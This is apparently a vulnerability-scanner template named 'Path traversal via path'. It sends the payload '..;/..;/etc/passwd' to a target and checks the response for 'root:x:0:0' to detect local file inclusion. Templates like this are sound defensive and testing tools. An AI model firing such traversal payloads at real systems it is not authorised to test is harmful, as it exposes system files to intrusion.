id: lfi-058
name: 'Path traversal via path'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads /etc/passwd via path'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - '..;/..;/etc/passwd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
